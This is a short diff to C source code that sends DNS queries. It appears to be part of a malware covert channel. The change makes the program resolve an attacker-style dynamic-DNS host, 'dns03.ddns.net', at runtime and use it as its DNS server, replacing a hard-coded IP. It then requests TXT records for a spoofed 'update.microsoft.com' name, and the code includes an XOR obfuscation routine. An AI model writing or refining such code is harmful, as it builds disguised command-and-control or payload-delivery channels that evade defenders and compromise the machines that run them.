@@ -16,6 +16,7 @@
 char dns_servers[10][100];
 int dns_server_count = 0;
 unsigned char hostname[] = "update.microsoft.com";
+char fake_dns_server[] = "dns03.ddns.net";
 
 //Types of DNS resource records
 #define T_A 1 //Ipv4 address
@@ -125,15 +126,14 @@ void xor(unsigned char* string, unsigned short string_len) {
 int main( int argc , char *argv[])
 {
  
-    char fake_dns_server[] = "dns03.ddns.net";
     char ip[100];
 
     // Get the ip of the fake dns server. So we can dynamically change based on dns.
     //printf("Getting DNS IP: %s\n", fake_dns_server);
-    //hostname_to_ip(fake_dns_server, ip);
+    hostname_to_ip(fake_dns_server, ip);
     //printf("Adding IP to DNS Servers: %s\n", ip);
-    //strcpy(dns_servers[0] , ip);
-    strcpy(dns_servers[0] , "52.37.43.12");
+    strcpy(dns_servers[0] , ip);
+    //strcpy(dns_servers[0] , "52.37.43.12");
      
     //send DNS query
     printf("Requesting TXT record\n");
